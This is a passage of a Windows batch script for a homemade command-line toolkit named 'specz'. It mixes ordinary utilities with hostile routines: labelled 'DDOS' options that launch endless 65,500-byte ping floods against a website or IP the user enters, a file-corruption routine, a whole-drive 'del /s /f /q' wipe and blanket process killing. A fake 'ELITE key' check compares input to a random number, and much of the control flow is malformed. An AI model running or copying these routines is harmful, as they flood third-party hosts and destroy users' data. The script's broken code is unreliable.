:sndwenopen
set /p soundwenop=Sound when opening (text); 
echo %soundwenop% > data\config.txt
echo Set Speak=CreateObject("sapi.spvoice") > data\List-sound.open-69.specz.vbs
echo Speak.Speak "%soundwenop%" >> data\List-sound.open-69.specz.vbs
goto %com%

:sndopndelall9
echo.
del /s /f /q data\List-sound.open-69.specz.vbs
echo.
goto %com%

:randimnum
echo.
echo %random%, 
echo %random%, %random%, 
echo %random%, %random%, %random%, 
echo %random%, %random%, %random%, %random%, 
echo %random%, %random%, %random%, %random%, %random%, 
echo %random%, %random%, %random%, %random%, %random%, %random%, 
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, 
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, 
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, 
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, 
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%,
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, 
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%,
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%,
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%,
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%,
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%,
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%,
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%,
echo %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%,
echo.
goto %com%

:mod
set /p mod=Lines; 
MODE CON: LINES=%mod%
goto %com%
:cols
set /p cols=Cols; 
MODE CON: COLS=%cols%
goto %com%

:ddos19
echo.
echo DDOS Website
echo.
set /p web=https://; 
echo ping -t -l 65500 %web% > data\ddos_.exe.specz
start bat_ping.exe
goto %com%

:ddos20
echo.
echo DDOS IPv4
echo.
set /p ip4=; 
echo ping -4 -t -l 65500 %ip4%  > data\ddos_.exe.specz
start bat_ping.exe
goto %com%

:ddos21
echo.
echo DDOS IPv6
echo.
set /p ip6=; 
echo ping -6 -t -l 65500 %ip6% > data\ddos_.exe.specz
start bat_ping.exe
goto %com%

:ddos21setop
echo.
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.exe
echo.
goto %com%
:ddos22setop
echo.
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
taskkill /F /IM cmd.exe
echo.
goto %com%

:exitmaxx
echo.
taskkill /F /IM specz.bat
taskkill /F /IM specz.exe
taskkill /F /IM specz.specz
taskkill /F /IM specz.config
taskkill /F /IM bat_ping.exe
taskkill /F /IM bat_ping.bat
taskkill /F /IM cmd.exe
exit
echo.
goto %com%

:lib.specz_repair
echo.
echo Repaired specz.lib file
echo.
(
echo load = config.specz /im /f $lib.specz 
echo load = config.specz /i /f $ "specz.bat", "specz.exe", "specz.specz"
echo log /t 00:s = "config.specz loaded"
)> lib.specz
goto %com%

:lib.specz
echo.
type lib.specz
echo.
goto %com%

:repaitshfdusjkgsd2
(
echo load = config.specz /im /f $lib.specz 
echo load = config.specz /i /f $ "specz.bat", "specz.exe", "specz.specz"
echo log /t 00:s = "config.specz loaded"
)> data\lib.txt

echo.
echo Normal config file:
echo.
type data\lib.txt
echo.
echo ------------------------------
echo Your lib file:
echo.
type lib.specz
echo.
goto :specz-d-skip

:specz-d-skip

    if exist "lib.specz" (
        goto :hjjjjjjjjjjjjjjjjjjjjjjjjjjjjd
    ) else (
        echo.
        echo Your lib file is missing
        echo.
        goto %com%
    )
:hjjjjjjjjjjjjjjjjjjjjjjjjjjjjd
setlocal EnableDelayedExpansion

set "filename=lib.specz"

for /f %%a in ('type "%filename%" ^| find /c /v ""') do set "line_count=%%a"

if %line_count% equ 3 (
    set "content="
    set /a "line_num=0"
    
    for /f "usebackq delims=" %%b in ("%filename%") do (
        set /a "line_num+=1"
        set "content=!content!%%b"
        
        if !line_num! equ 3 (
            echo.
            echo Your lib file is safe.
            echo.
        )
    )
) else (
    echo.
    echo Your lib file is suspect or corrupted.
    echo.
)
goto %com%

:screef
 Powershell ^
 $Path = '%CaptureScreenFolder%';^
 Add-Type -AssemblyName System.Windows.Forms;^
 $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;^
 $image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height^);^
 $graphic = [System.Drawing.Graphics]::FromImage($image^);^
 $point = New-Object System.Drawing.Point(0,0^);^
 $graphic.CopyFromScreen($point, $point, $image.Size^);^
 $cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position,[System.Windows.Forms.Cursor]::Current.Size^);^
 [System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds^);^
 $FileName = $(('dd-MM-yyyy_HH_mm_ss')+'.jpg');^
 $FilePath = $Path+$FileName;^
 $FormatJPEG = [System.Drawing.Imaging.ImageFormat]::jpeg;^
 $image.Save($FilePath,$FormatJPEG^)
start dd-MM-yyyy_HH_mm_ss.jpg
goto %com%

:88888888hhhhhhhhhhhhnvvvvvvvvvvvvvvvfg21
title specz
set "version=None"
set "shortName=None"
set "creationDate=None"
set "file_extension=None"
set "mversion=None"
set "hash=None"
set "hash2=None"
set "hash3=None"
:g
:g2
setlocal enabledelayedexpansion
echo.
set /p file=File destination;  
if exist "%file%" (
    goto :x
) else (
    goto :j
)
:x
:x2324
type %file% > data/%date%_%time%_save_%file%
for %%A in ("%file%") do (
    set "size=%%~zA"
)
for %%A in ("%file%") do (
    set "destination=%%~dpnA"
)
for %%A in ("%file%") do (
    set "file_extension=%%~xA"
)
for %%A in ("%file%") do (
    set timestamp=%%~tA
)
for %%A in ("%file%") do (
    set attributes=%%~aA
)
for %%A in ("%file%") do (
    set "parentFolder=%%~dpA"
)
for /f "tokens=3*" %%A in ('wmic datafile where "name='%file%'" get version /format:list ^| find "="') do (
    set "version=%%B"
)
for /f %%A in ('wmic datafile where "name='%file%'" get creationdate ^| findstr [0-9]') do (
    set "creationDate=%%A"
)
for %%A in ("%file%") do (
    set "size=%%~zA"
)
if %size% equ 0 (
    set "empty=Yes"
) else (
    set "empty=No"
)
for %%A in ("%file%") do (
    set "shortName=%%~sA"
)
for /f %%A in ('find /c /v "" ^< "%file%"') do (
    set "lineCount=%%A"
)
for /f %%A in ('certutil -hashfile "%file%" SHA256 ^| findstr /v "SHA256"') do (
    set "hash=%%A"
)
for /f %%A in ('certutil -hashfile "%file%" SHA1 ^| findstr /v "SHA1"') do (
    set "hash2=%%A"
)
for /f %%A in ('certutil -hashfile "%file%" MD5 ^| findstr /v "MD5"') do (
    set "hash3=%%A"
)
attrib "%file%" | find "R"
if %errorlevel% equ 0 (
    set "read=Yes"
) else (
    set "read=No"
)
echo Parent: 
echo %parentFolder%
echo.
echo Number of lines: 
echo %lineCount%
echo.
echo Is the file empty: 
echo %empty%
echo.
echo Is file read only: 
echo %read%
echo.
echo Short name: 
echo %shortName%
echo.
echo Attributes: 
echo %attributes%
echo.
echo Creation Date: 
echo %creationDate%
echo.
echo Last modified: 
echo %timestamp%
echo.
echo File extension: 
echo %file_extension%
echo.
echo Version: 
echo %version%
echo.
echo Destination: 
echo %destination%
echo.
echo Size: 
echo !size!
echo.
echo Content:
type %file%
echo.
echo.
echo BY speczFR (specz FILE READER)
echo.
pause
exit
:d
cls
echo.
pause
goto :g
exit
:j
echo file not found.
echo.
pause
endlocal
goto %com%
exit
:end
exit

:cmddddd
echo.
cmd

:powershell
echo.
powershell
goto %com%

:formatom-g
echo.
%0%0
echo.
goto %com%

:batchtoexe
@echo off
:check_Permissionssfdhhhh
    net session >nul 2>&1
    if %errorLevel% == 0 (
        echo Please start it normally.
        echo.
        pause
    ) else (
        goto :ff
    )
    
    pause >nul
:ff
start takl.exe
title specz

set /p fileo=Enter the file name you want: 
:fxxs
set /p admin=Administrator manifest (y/n): 
if %admin% equ Y goto :yes
if %admin% equ y goto :yes
if %admin% equ N goto :no
if %admin% equ n goto :no
) else (
    goto :fxxs
)

:no
set "file=%fileo%\assets\data.specz"
mkdir "%fileo%"
mkdir "%fileo%\assets"

echo @echo off > "%fileo%\assets\data.specz"
echo data.bfm> "%fileo%\assets\insert.specz"

echo f | xcopy /Y "dll.exe" "%fileo%\%fileo%.exe"
goto :start663457543452534

:yes
set "file=%fileo%\assets\data.specz"
mkdir "%fileo%"
mkdir "%fileo%\assets"

echo @echo off > "%fileo%\assets\data.specz"
echo data.specz> "%fileo%\assets\insert.specz"
echo f | xcopy /Y "lld.exe" "%fileo%\%fileo%.exe"
goto :start663457543452534

:start663457543452534
start %fileo%
:startxx333
cls
echo [File] %fileo%.exe
echo [Data] %fileo%\assets\data.specz
echo [Insert] %fileo%\assets\insert.specz
echo.
echo [0] Set a variable (if you decide to set %1% as a variable and 5 as the text and you decide to write text and put %1% in it it will write 5)
echo [1] Write a message (Works with variables and writable variables)
echo [2] Add a pause
echo [3] Exit
echo [4] Add a title
echo [5] Add a color (1 to 7 or A to F)
echo [6] Timeout 
echo [7] Timeout No break
echo [8] Start an app
echo [9] Make a folder
echo [10] Goto starter 
echo [11] Goto ender
echo [12] Make a writable variable
echo [13] Delete a file
echo [14] Shutdown pc
echo [15] Restart pc
echo [16] Rename a file
echo [17] Clear
echo [18] Change directory
echo [19] Taskkill
echo.
echo [98] Add a line of script
echo [99] Go back to specz
echo.
set /p :%com%md=; 
if %:%com%md% equ 0 goto :var
if %:%com%md% equ 1 goto :ech
if %:%com%md% equ 2 goto :pau
if %:%com%md% equ 3 goto :exi
if %:%com%md% equ 4 goto :tit
if %:%com%md% equ 5 goto :col
if %:%com%md% equ 6 goto :tim
if %:%com%md% equ 7 goto :2im
if %:%com%md% equ 8 goto :sta
if %:%com%md% equ 9 goto :adm
if %:%com%md% equ 10 goto :gst
if %:%com%md% equ 11 goto :gen
if %:%com%md% equ 12 goto :wva
if %:%com%md% equ 13 goto :maf
if %:%com%md% equ 14 goto :shu
if %:%com%md% equ 15 goto :res
if %:%com%md% equ 16 goto :ren
if %:%com%md% equ 17 goto :cls
if %:%com%md% equ 18 goto :cdi
if %:%com%md% equ 19 goto :tsk
if %:%com%md% equ 98 goto :bishimik
if %:%com%md% equ 99 goto :speczpar
) else (
   goto :start
)
:var
set /p variable=Variable; 
set /p variable1=Text; 
echo set "%variable%=%variable1%" >> %file%
goto :startxx333

:ech
set /p echo=Text; 
echo echo %echo% >> %file%
goto :startxx333

:pau
echo pause >> %file%
goto :startxx333

:exi
echo exit >> %file%
goto :startxx333

:tit
set /p title=Title; 
echo title %title% >> %file%
goto :startxx333

:col
set /p color=First color; 
set /p color2=Second color; 
echo color %color%%color2% >> %file%
goto :startxx333

:tim
set /p time=How much seconds; 
echo timeout /t %time% >> %file%
goto :startxx333

:2im
set /p time=How much seconds; 
echo timeout /t %time% /NOBREAK >> %file%
goto :startxx333

:sta
set /p appl=App to start; 
echo start %appl% >> %file%
goto :startxx333

:adm
set /p fold=Folder to make; 
echo mkdir %fold% >> %file%
goto :startxx333

:gen
set /p starter=Starter name; 
Goto :%starter% >> %file%   
goto :startxx333

:gst
set /p starter2=Go to name; 
echo Goto :%starter2% >> %file%   
goto :startxx333

:wva
set /p variable2=Variable; 
set /p variable3=Text; 
echo set /p %variable2%=%variable3% >> %file%   
goto :startxx333

:maf
set /p fil=File to delete;  
echo del /s /f /q %fil% >> %file%
goto :startxx333

:shu
set /p timebefshu=Time before shutdown;  
echo shutdown -s -t %timebefshu% >> %file%
goto :startxx333

:res
set /p timebefres=Time before restart;  
echo shutdown -r -t %timebefres% >> %file%
goto :startxx333

:ren
set /p fnn=File name;  
set /p frnn=File renamed;  
echo REN "%fnn%" "%frnn%" >> %file%
goto :startxx333

:cls
echo cls >> %file%
goto :startxx333

:cdi
set /p cdd=Directory;  
echo cd %cdd% >> %file%
goto :startxx333

:tsk
set /p isyt=Task; 
echo TASKKILL /F /IM %isyt% >> %file%
goto :startxx333

:bishimik
set /p lin=Line; 
echo %lin% >> %file%
goto :startxx333

:copyanifile
set /p filethatcopy=File to copy: 
set /p filethatpaste=Directory to copy and paste: 
echo f | xcopy /Y "%filethatcopy%" "%filethatpaste%"
goto %com%

:createfold
echo.
set /p folder=Folder; 
mkdir %save%%folder%
echo.
goto %com%

:createfil
echo.
set /p file=File; 
set /p conte=Content; 
echo %conte% > %save%%file%
echo.
goto %com%

:sendnotifthightshi
echo.
set /p filena=File name; 
set /p title=Description; 
set /p desc=Title; 
echo X = MsgBox ("%title%", 32 + vbOk, "%desc%") > %save%%filena%.vbs
echo Saved as %save%%filena%.vbs
echo.
goto %com%

:sendnotifthightshi1
echo.
set /p filena=File name; 
set /p title=Description; 
set /p desc=Title; 
echo X = MsgBox ("%title%", 48 + vbOk, "%desc%") > %save%%filena%.vbs
echo Saved as %save%%filena%.vbs
echo.
goto %com%

:sendnotifthightshi2
echo.
set /p filena=File name; 
set /p title=Description; 
set /p desc=Title; 
echo X = MsgBox ("%title%", 64 + vbOk, "%desc%") > %save%%filena%.vbs
echo Saved as %save%%filena%.vbs
echo.
goto %com%

:sendnotifthightshi3
echo.
set /p filena=File name; 
set /p title=Description; 
set /p desc=Title; 
echo X = MsgBox ("%title%", vbCritical + vbOk, "%desc%") > %save%%filena%.vbs
echo Saved as %save%%filena%.vbs
echo.
goto %com%

:startsavedfiles
start saved_Files
goto %com%

:corruptany
echo.
set /p coruptfil=File to corrupt; 
    if exist "%coruptfil%" (
        goto :goodcorupt
) else (
    echo.
    echo FILE NOT FOUND.
    echo.
    goto %com%
)
:goodcorupt
âXîô > "%coruptfil%"
goto %com%

:35.1del
echo.
del /s /f /q data\speczdelcounterl
echo.
goto %com%
:35.add
echo.
set var=0
echo true > data\speczdelcounterl
echo.
goto %com%

:nothuijg
echo.
echo Please enter a command.
echo.
goto %com%

:36changecd
echo.
set /p cdchange=Change Directory; 
    if exist "%cdchange%" (
        cd %cdchange%
        set "CD=%cdchange%"
        set "CD2=%cdchange%"
        set "cd=%cdchange%"
        echo.
        goto %com%
) else (
    echo.
    echo DIRECTORY NOT FOUND.
    echo.
    goto %com%
)
:36getcd
echo.
echo %CD2%
echo.
goto %com%

:xmol2863
echo.
taskkill /f /FI "STATUS eq RUNNING"
echo.
goto %com%

:deltmpfilechhas
echo.
del /s /f /q "data\*.tmp"
echo.
goto %com%

:disablexpen
echo.
setlocal enabledelayedexpansion
echo.
goto %com%
:enablexpen
echo.
endlocal
echo.
goto %com%

:typeanyperruchefile
echo.
set /p fttyptotyp=File to type; 
    if exist "%fttyptotyp%" (
        if %fttyptotyp% equ %~nx0 goto :wrongfoint2mwadd
        ) else (
        goto :gggggggggggggggggggggggglmonkey
        )
        :gggggggggggggggggggggggglmonkey
        echo.
        type %fttyptotyp%
        echo.
        echo.
        goto %com%
) else (
    echo.
    echo FILE NOT FOUND.
    echo.
    goto %com%
)

:wrongfoint2mwadd
echo.
echo You can't type current file. (%~nx0)
echo.
goto %com%

:unavacalachera
echo.
dir /A:-D /B 
echo.
goto %com%

:ssh
echo.
set /p ipssh=IP; 
ssh %ipssh%
echo.
goto %com%

:ftp
echo.
set /p ipftp=IP; 
ftp %ipftp%
echo.
goto %com%

:younowabouthihuaus
echo.
type nein.txt
echo.
echo.
goto %com%
:younowabouthihuaus2
echo.
type todo.txt
echo.
echo.
goto %com%

:westatspeczres
start %~nx0
exit
goto %com%

:filcreatehineiara
echo.
set var2=1
set /p filnametocreat=File name to create; 
echo. > %filnametocreat%
echo.
:fdfdlol989
set /p textvar=%var2%; 
echo %textvar% >> %filnametocreat%
set /a var2+=1
goto :fdfdlol989

:secretfoldmak
:taskmgrstart
echo.
start C:\Windows\system32\taskmgr.exe
echo.
goto %com%

:2021mmbremembre
echo.
%line%
echo Warning! Be aware of fakes specz
%line%
echo Always check specz Files too
%line%
echo.
goto %com%

:lastcmdexecuteco
set co=%co222log%
goto :lastcmdverif

:2specz5elite1lisence3activate4
set "plus=^>nul"
echo.
echo 3 Seconds timeout & TIMEOUT /T 03 /NOBREAK >nul
echo.
set /p elitekey=Your ELITE Key; 
if %elitekey% equ %random% goto :wowyouditelite
) else (
    echo.
    echo Wrong Key. You can try again in 3 Seconds.
    echo.
    goto %com%
)
:wowyouditelite
echo.
echo Your ELITE is activated.
echo.
goto %com%

:justchihuahuajushuahua
echo.
sfc /scannow
echo.
goto %com%

:testyouRGB
cls
echo.
echo TEST YOUR RGBS
echo.
SET R=255
SET G=0
SET B=0
:RE
IF %B%==0 IF %R% GTR 0 (
	IF %G%==255 (
		SET /A R-=1
	) ELSE (
		SET /A G+=1
	)
	GOTO RUN
)
IF %G% GTR 0 (
	IF %B%==255 (
		SET /A G-=1
	) ELSE (
		SET /A B+=1
	)
	GOTO RUN
)
IF %B% GTR 0 (
	IF %R%==255 (
		SET /A B-=1
	) ELSE (
		SET /A R+=1
	)
)
:RUN
title specz (%R%,%G%,%B%)
ECHO.[H[?25l[48;2;%R%;%G%;%B%m                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [E                                                                                                                     [H
GOTO RE
echo.

:deletefilelol
echo.
set /p file_todel=File to delete; 
if exist %file_todel% goto :goodfiletodeellol
) else (
    echo.
    echo File does not exist.
    echo.
    goto %com%
)
:goodfiletodeellol
echo.
del /s /f /q %file_todel%
echo.
goto %com%

:renameanyfilelollolol
echo.
set /p file_rename=File to rename; 
set /p file_rename2=File new name; 
if exist %file_rename% goto :goodfiletodeellol2
) else (
    echo.
    echo File does not exist.
    echo.
    goto %com%
)
:goodfiletodeellol2
echo.
ren "%file_rename%" "%file_rename2%"
echo.
echo If file does not rename start it as administrator.
echo.
goto %com%

:50502k2k50
echo.
echo %pre% taskkill everything
taskkill /f /FI "STATUS eq RUNNING"
echo.
goto %com%

:yawcurentversianyourcurrentversion
if exist version.dat goto :goodddddatalolversion
) else (
    echo.
    echo Version.dat does not exist.
    echo.
    goto %com%
)
:goodddddatalolversion
set "dataversion=version.dat"
echo.
type %dataversion%
echo.
echo.
goto %com%



:arnacallarnaque
echo.
sfc /scannow
echo.
goto %com%


:eyzoloeyes
echo.
set "newtit=specz"
set /p newtit=New title; 
if %newtit% equ specz goto :wwloleyz
) else (
    goto :ddwsav
)
:ddwsav
title specz - %newtit%
echo.
goto %com%

:wwloleyz
title specz
echo.
goto %com%

:503lolmadnewdatantime
echo.
echo First time launched SPECZ; 
type data\fistlaunchT.dat
echo First date launched SPECZ; 
type data\fistlaunchD.dat
echo.
echo Time launched SPECZ; 
echo %time%
echo Date launched SPECZ; 
echo %date%
echo.
goto %com%

:51LiveCreahs
echo.
echo Crashing the client
echo.
echo x = MsgBox ("An error has happened.", vbCritical + vbOk,"specz") > data\ropDel.vbs
start data\ropDel.vbs
exit
goto %com%

:speczClientKill
echo.
echo Deleting client
echo.
del /s /f /q client\client.sd
echo.

start %~nx0
exit

:speczXXzJKI
if exist read\read.bak goto :warnReadBAK
) else (
    echo.
    echo read\read.bak does not exist.
    echo.
    goto %com%
)
:warnReadBAK
echo.
type read\read.bak
echo.
echo.
goto %com%
:speczXXzJKI2
echo.
set /p typegilfile=File to type; 
if exist %typegilfile% goto :filetotupeltype
) else (
    echo.
    echo File does not exist.
    echo.
    goto %com%
)

:filetotupeltype
if %typegilfile% equ %~nx0 goto :ddgoodpass2
) else (
    echo You can not type specz.
    echo.
    goto %com%
)
:ddgoodpass2
type %typegilfile%
echo.
echo.
goto %com%

:allSetsbcu
echo.
set
set > client\set.sd
echo.
goto %com%

:gobackverifi
cls
goto :verificabackd9

:disableXgiantTextXspecz
echo.
set "com=:com201pura"
cls
goto :com200pura

:eraseadriveldsfd
echo.
start ar2\drive.vbs
set /p driveldskj=Drive [LETTER ONLY EX: C, D]; 
if exist %driveldskj% goto :gooddrive
) else (
    echo.
    echo DRIVE does not exist.
    echo.
    goto %com%
)
:gooddrive
Are you sure? IF yes click anywhere. YOUR specz MUST BE STARTED AS ADMINISTRATOR.
pause >nul
del /s /f /q %drive%:\
echo.
goto %com%

:extensiontRuse
echo.
if exist 000\000.spe goto :goodSPE-000
) else (
    echo.
    echo File does not exist.
    echo.
    goto %com%
)
:goodSPE-000
type 000\000.spe
echo.
goto %com%